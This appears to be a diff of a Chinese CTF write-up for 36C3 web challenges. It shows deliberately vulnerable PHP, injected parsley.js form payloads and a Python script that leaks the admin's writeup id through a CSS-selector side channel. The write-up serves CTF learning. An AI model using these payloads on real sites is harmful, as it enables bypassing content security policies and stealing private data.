-         <span class=na>data-parsley-errors-container</span><span class=o>=</span><span class=s>&#34;a:contains(&#39;Writeup - 5&#39;):eq(0)&#34;</span> <span class=p>/&gt;&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
-</code></pre></div><p>或者使用<code>data-parsley-equalto</code> API 进行判断属性值：</p>
-<blockquote>
-<p><strong>data-parsley-equalto="#anotherfield"</strong></p>
-<p>Validates that the value is identical to another field&rsquo;s value (useful for password confirmation check).</p>
-</blockquote>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>data-parsley-validate</span><span class=p>&gt;</span>
-    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> 
-        <span class=na>data-parsley-trigger</span><span class=o>=</span><span class=s>&#34;focusout&#34;</span>
-        <span class=na>data-parsley-equalto</span><span class=o>=</span><span class=s>&#39;a[href^=&#34;/show.php?id=GUESS&#34;]&#39;</span>
-        <span class=na>data-parsley-errors-container</span><span class=o>=</span><span class=s>&#34;form[action=&#39;/like.php&#39;]&#34;</span>
-        <span class=na>data-parsley-error-message</span><span class=o>=</span><span class=s>&#39;&lt;input type=&#34;input&#34; name=&#34;id&#34; value=&#34;0000000000000000&#34;&gt;&#39;</span>
-        <span class=na>value</span><span class=o>=</span><span class=s>&#39;a[href^=&#34;/show.php?id=GUESS&#34;]&#39;</span>
-        <span class=na>autofocus</span><span class=p>&gt;</span>
-    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span><span class=p>&gt;</span>
-<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
-</code></pre></div><h2 id=includer>Includer</h2>
-<blockquote>
-<p><strong>Difficulty estimate</strong>: medium</p>
-<p><strong>Solved</strong>:9/321</p>
-<p><strong>Points</strong>: round(1000 · min(1, 10 / (9 + [9 solves]))) = <strong>556</strong> points</p>
-<p><strong>Description:</strong></p>
-<p>Just sitting here and waiting for PHP 8.0 (lolphp).</p>
-<p><strong>Download:</strong></p>
-<p><a class=link href=https://github.com/ZeddYu/36c3-CTF-Web/blob/master/includer/includer-df39401c4c1c28ab.tar.xz target=_blank rel=noopener>includer-df39401c4c1c28ab.tar.xz (3.5 KiB)</a></p>
-</blockquote>
-<p>题目给出源代码以及部署文件，源代码如下：</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
-<span class=k>declare</span><span class=p>(</span><span class=nx>strict_types</span><span class=o>=</span><span class=mi>1</span><span class=p>);</span>
-
-<span class=nv>$rand_dir</span> <span class=o>=</span> <span class=s1>&#39;files/&#39;</span><span class=o>.</span><span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>32</span><span class=p>));</span>
-<span class=nx>mkdir</span><span class=p>(</span><span class=nv>$rand_dir</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;mkdir&#39;</span><span class=p>);</span>
-<span class=nx>putenv</span><span class=p>(</span><span class=s1>&#39;TMPDIR=&#39;</span><span class=o>.</span><span class=no>__DIR__</span><span class=o>.</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$rand_dir</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;putenv&#39;</span><span class=p>);</span>
-<span class=k>echo</span> <span class=s1>&#39;Hello &#39;</span><span class=o>.</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39; your sandbox: &#39;</span><span class=o>.</span><span class=nv>$rand_dir</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
-
-<span class=k>try</span> <span class=p>{</span>
-    <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]),</span> <span class=s1>&#39;&lt;?&#39;</span><span class=p>)</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
-        <span class=k>include_once</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]);</span>
-    <span class=p>}</span>
-<span class=p>}</span>
-<span class=k>finally</span> <span class=p>{</span>
-    <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;rm -rf &#39;</span><span class=o>.</span><span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$rand_dir</span><span class=p>));</span>
-<span class=p>}</span>
-</code></pre></div><h3 id=configuration-error>Configuration Error</h3>
-<p>其中配置文件有一个比较明显的配置错误：</p>
-<pre tabindex=0><code class=language-config data-lang=config>location /.well-known {
+</code></pre><p>既然 flag 在数据库当中，那我们可以首先来看看 show.php ，因为这个文件可以直接用来获取 writeup 的内容。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>include_once</span> <span class=s1>&#39;../general.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$stmt</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span><span class=s1>&#39;SELECT id, content FROM `writeup` WHERE `id` = ?&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>bind_param</span><span class=p>(</span><span class=s1>&#39;s&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$writeup</span> <span class=o>=</span> <span class=nx>mysqli_fetch_all</span><span class=p>(</span><span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>get_result</span><span class=p>(),</span> <span class=nx>MYSQLI_ASSOC</span><span class=p>)[</span><span class=mi>0</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$stmt</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>prepare</span><span class=p>(</span><span class=s1>&#39;SELECT user_id FROM `like` WHERE `writeup_id` = ?&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>bind_param</span><span class=p>(</span><span class=s1>&#39;s&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>execute</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=o>=</span> <span class=nv>$stmt</span><span class=o>-&gt;</span><span class=na>get_result</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$likes</span> <span class=o>=</span> <span class=nx>mysqli_fetch_all</span><span class=p>(</span><span class=nv>$result</span><span class=p>,</span> <span class=nx>MYSQLI_ASSOC</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s1>&#39;../views/header.php&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s1>&#39;../views/show.php&#39;</span><span class=p>);</span>
+</span></span></code></pre></div><p>我们可以看到 id 并没有什么鉴权措施，也就是说，我们可以通过 writeup id 来获取 writeup 内容，而 flag writeup id 在 admin 用户数据当中，而在 header.php 中可以看到当前用户所有的 writeup id</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=k>foreach</span><span class=p>(</span><span class=nv>$writeups</span> <span class=k>as</span> <span class=nv>$w</span><span class=p>)</span><span class=o>:</span> <span class=cp>?&gt;</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>  &lt;li&gt;&lt;a href=&#34;/show.php?id=&lt;?= $w[&#39;id&#39;] ?&gt;&#34;&gt;Writeup - &lt;?= $w[&#39;id&#39;] ?&gt;&lt;/a&gt;&lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;?php endforeach; ?&gt;
+</span></span></span></code></pre></div><p>既然有提交代码给 admin 的功能，那么是不是有可能是一个 xss 或者什么的？</p><p>我们还可以看到 admin 再收到 writeup 后的主要操作：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>display</span> <span class=o>=</span> <span class=n>Display</span><span class=p>(</span><span class=n>visible</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=p>(</span><span class=mi>800</span><span class=p>,</span> <span class=mi>600</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>display</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>chrome_options</span> <span class=o>=</span> <span class=n>Options</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>chrome_options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--disable-gpu&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>chrome_options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--headless&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>chrome_options</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;--no-sandbox&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>driver</span> <span class=o>=</span> <span class=n>webdriver</span><span class=o>.</span><span class=n>Chrome</span><span class=p>(</span><span class=s1>&#39;/usr/bin/chromedriver&#39;</span><span class=p>,</span> <span class=n>options</span><span class=o>=</span><span class=n>chrome_options</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://admin:__ADMIN_TOKEN__@127.0.0.1/login_admin.php?id=&#39;</span><span class=o>+</span><span class=n>writeup_id</span>
+</span></span><span class=line><span class=cl><span class=n>driver</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>element</span> <span class=o>=</span> <span class=n>driver</span><span class=o>.</span><span class=n>find_element_by_xpath</span><span class=p>(</span><span class=s1>&#39;//input[@id=&#34;like&#34;]&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>element</span><span class=o>.</span><span class=n>click</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>driver</span><span class=o>.</span><span class=n>quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>display</span><span class=o>.</span><span class=n>stop</span><span class=p>()</span>
+</span></span></code></pre></div><p>我们可以看到 admin 在进行登录之后使用<code>find_element_by_xpath</code>找到了 id 为 like 的 input 标签，并进行了点击，也就是提交给 admin 的 writeup 后，admin 会浏览进行点击，发送一个点赞请求</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;post&#34;</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/like.php&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;c&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&lt;?= $_SESSION[&#39;c&#39;] ?&gt;&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;hidden&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;id&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&lt;?= $writeup[&#39;id&#39;] ?&gt;&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;like&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;👍&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>接着我们来看看 general.php 中的防御措施</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>([</span><span class=s1>&#39;cookie_httponly&#39;</span> <span class=o>=&gt;</span> <span class=k>true</span><span class=p>,</span> <span class=s1>&#39;cookie_samesite&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;Strict&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=c1>//...
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>id</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$nonce</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>id</span><span class=p>());</span>
+</span></span><span class=line><span class=cl><span class=c1>//...
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>header</span><span class=p>(</span><span class=s1>&#39;x-xss-protection: 1; mode=block&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s1>&#39;X-Content-Type-Options: nosniff&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s1>&#39;x-frame-options: DENY&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Referrer-Policy: no-referrer&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Feature-Policy: geolocation &#39;none&#39;; midi &#39;none&#39;; sync-xhr &#39;none&#39;; microphone &#39;none&#39;; camera &#39;none&#39;; magnetometer &#39;none&#39;; gyroscope &#39;none&#39;; speaker &#39;none&#39;; fullscreen &#39;none&#39;; payment &#39;none&#39;; usb &#39;none&#39;; vr &#39;none&#39;; encrypted-media &#39;none&#39;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;nonce-&#34;</span><span class=o>.</span><span class=nv>$nonce</span><span class=o>.</span><span class=s2>&#34;&#39; https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri &#39;self&#39;; form-action &#39;self&#39;; frame-ancestors &#39;none&#39;; require-sri-for script style;&#34;</span><span class=p>);</span>
+</span></span></code></pre></div><p>而<code>script-src</code>设置的 nonce 只在 header.php 使用了，而且我们也拿不到这个 nonce</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span> <span class=nx>nonce</span><span class=o>=</span><span class=s2>&#34;&lt;?=</span><span class=si>$nonce</span><span class=s2>?&gt;&#34;</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=err>$</span><span class=p>(</span><span class=s1>&#39;#publish-form&#39;</span><span class=p>)</span><span class=o>.</span><span class=nx>parsley</span><span class=p>()</span> <span class=c1>// prevent hacking
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&lt;/</span><span class=nx>script</span><span class=o>&gt;</span>
+</span></span></code></pre></div><p>所以我们可能需要往点击事件那一方面思考，并且利用题目引入的两个 js 文件入手，一个 jquery.js ，另一个 parsley.js。</p><h3 id=parsleyjs>Parsley.js</h3><p>我们可以去 <a class=link href=https://parsleyjs.org/doc/index.html target=_blank rel=noopener>parsley.js doc</a> 看到该 lib 的简单说明以及使用：</p><blockquote><p>Parsley is a javascript form validation library. It helps you provide your users with feedback on their form submission before sending it to your server. It saves you bandwidth, server load and it saves time for your users.</p><p>Javascript form validation is not necessary, and if used, it <strong>does not replace strong backend server validation.</strong></p><p>That&rsquo;s why Parsley is here: to let you define your general form validation, implement it on the backend side, and simply port it frontend-side, with maximum respect to user experience best practices.</p></blockquote><p>可以看出这是个简单的前端验证库，简单查一下文档，我们可以发现有几个有意思的 API：</p><blockquote><p><strong>data-parsley-trigger=&ldquo;input&rdquo;</strong></p><p>Specify one or many javascript events that will trigger item validation, before any failure. To set multiple events, separate them with a space data-parsley-trigger=&ldquo;focusin focusout&rdquo;. Default is null. See the various events supported by jQuery.</p><p><strong>data-parsley-error-message=&ldquo;my message&rdquo;</strong></p><p>Customize a unique global message for the field.</p><p><strong>data-parsley-errors-container="#element"</strong></p><p>Specify the existing DOM container where ParsleyUI should put the errors. It is also possible to configure it with a callback function from javascript, see the annotated source.</p></blockquote><p>根据文档，我们可以利用<code>data-parsley-trigger</code>设置我们的触发方式，使用<code>data-parsley-error-message</code>来自定义我们的错误信息，使用<code>data-parsley-errors-container</code>来自定义我们的显示错误的位置。</p><p>根据文档，我们可以简单用一个<code>data-parsley-validate</code>指定我们需要验证的表单，然后利用错误信息把元素标签输出出来，并且我们接着还可以利用指定输出位置来控制输出，例如：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>data-parsley-validate</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> 
+</span></span><span class=line><span class=cl>            <span class=na>data-parsley-trigger</span><span class=o>=</span><span class=s>&#34;blur&#34;</span> <span class=na>autofocus</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;some-field&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=na>data-parsley-error-message</span><span class=o>=</span><span class=s>&#34;&lt;input id=like type=button value=padyload&gt;&#34;</span> 
+</span></span><span class=line><span class=cl>            <span class=na>data-parsley-required</span>
+</span></span><span class=line><span class=cl>            <span class=na>data-parsley-errors-container</span><span class=o>=</span><span class=s>&#34;#div1&#34;</span><span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p><code>data-parsley-trigger</code>指定了<code>blur</code>事件，也就是当我们的 input 失焦时，会显示我们的错误信息，并且在 id 为 div1 的元素中显示，更重要的是，浏览器也将其进行了渲染。</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png loading=lazy></a></figure></p><p>###Click</p><p>回到题目当中，admin 所做的动作有两个，一个就是登录，根据题目信息，我们基本上对这个操作没办法进行什么干扰，另外一个就是点赞了，更具体来说就是通过 show.php 打开你的 writeup 内容，并且点击页面上 id 为 like 的 input 标签，所以我们更可能的事对点赞操作进行一个干扰或者其他的操作，并且根据实际测试，通过 <code>selenium.webdriver</code>调用<code>find_element_by_xpath</code>函数得到的 id 为 like 的 input 元素只能有第一个，也就是说，即使我们在 writeup 内容中插入一个 id 为 like 的 input 标签，admin 也只会根据页面顺序拿到第一个点赞 input 。</p><p>并且 CSP 也限制得很严格，似乎陷入了僵局，但是如果我们有以上 parsley.js 的知识，我们似乎可以通过错误信息来构造一些 Payload 。</p><p>首先，因为<code>find_element_by_xpath</code>只会得到第一个 id 为 like 的 input 标签，而我们通过 parsley.js 可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的 id 为 like 的 input 标签插入到原来的点赞按钮之前。</p><p>但是这有什么用呢？我们再来仔细看看 admin 要点赞的那个页面</p><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png loading=lazy></a></figure></p><p>页面上部分是 header.php ，会展示当前用户所提交的 writeup ，也就是说 admin 的这个页面，第一个也是唯一一个 a 标签就是 flag 的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个 a 标签中的 href 属性值，或者更确切的说就是获取 writeup id 的事情了。</p><h3 id=css-selector>CSS Selector</h3><p>如何获取 a 标签中的 href 属性值貌似也就跟我们之前提到的<code>data-parsley-errors-container</code> API 有关了，而这个 API 又支持 CSS 选择器，那我们是不是可以通过 CSS 选择器来让我们的报错信息放到这个 a 标签之后呢，这样以来也就直接就放到了点赞按钮之前了。</p><p>类似之前 XCTF Final 一个 CSS 侧信道的题目，我们可以通过利用<code>a[href^='/show.php?id={flag}]</code>的形式来进行元素选择。</p><p>也就是说，当我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分完全匹配的时候，我们可以把一个无效的 id=like input 标签插入到该 a 标签之后，亦即真正用于提交 like 请求的 input 标签之前；如果我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分不完全匹配的，parsley.js 什么也不会做，admin 会正常地点赞，我们可以正常地在自己的 writeup 页面看到 admin 的点赞。</p><p>所以基于这个差异，我们可以利用这种形式来进行一个侧信道攻击获取 flag 的 writeup id。</p><p>脚本编写也比较简单：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>base_url</span> <span class=o>=</span> <span class=s2>&#34;http://ip:8001/&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>base_url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>pos</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;name=&#34;c&#34; value=&#34;&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=s1>&#39;name=&#34;c&#34; value=&#34;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>csrftoken</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>[</span><span class=n>pos</span><span class=p>:</span><span class=n>pos</span><span class=o>+</span><span class=mi>16</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ss</span> <span class=o>=</span> <span class=s2>&#34;1234567890abcdef&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>ss</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&lt;form data-parsley-validate&gt;&lt;input data-parsley-required data-parsley-trigger=</span><span class=se>\&#34;</span><span class=s2>blur</span><span class=se>\&#34;</span><span class=s2> data-parsley-error-message=&#39;&lt;input type=</span><span class=se>\&#34;</span><span class=s2>input</span><span class=se>\&#34;</span><span class=s2> id=like value=</span><span class=se>\&#34;</span><span class=s2>rebirth_is_really_nb</span><span class=se>\&#34;</span><span class=s2>&gt;&#39; data-parsley-errors-container=</span><span class=se>\&#34;</span><span class=s2>a[href^=&#39;/show.php?id=</span><span class=si>{</span><span class=n>flag</span> <span class=o>+</span> <span class=n>j</span><span class=si>}</span><span class=s2>&#39;]</span><span class=se>\&#34;</span><span class=s2> autofocus&gt;&lt;/form&gt;&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;c&#39;</span><span class=p>:</span> <span class=n>csrftoken</span><span class=p>,</span> <span class=s1>&#39;content&#39;</span><span class=p>:</span> <span class=n>payload</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>base_url</span> <span class=o>+</span> <span class=s2>&#34;add.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>allow_redirects</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=c1># print(res.headers)</span>
+</span></span><span class=line><span class=cl>        <span class=n>location</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;Location&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>pos</span> <span class=o>=</span> <span class=n>location</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;id=&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>3</span>
+</span></span><span class=line><span class=cl>        <span class=n>wp</span> <span class=o>=</span> <span class=n>location</span><span class=p>[</span><span class=n>pos</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;c&#39;</span><span class=p>:</span> <span class=n>csrftoken</span><span class=p>,</span> <span class=s1>&#39;id&#39;</span><span class=p>:</span> <span class=n>wp</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>base_url</span> <span class=o>+</span> <span class=s2>&#34;admin.php&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;http://ip:8001/show.php?id=</span><span class=si>{</span><span class=n>wp</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=c1># print(res.text)</span>
+</span></span><span class=line><span class=cl>        <span class=n>txt</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;Liked by&lt;/h3&gt;admin&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>txt</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=n>j</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
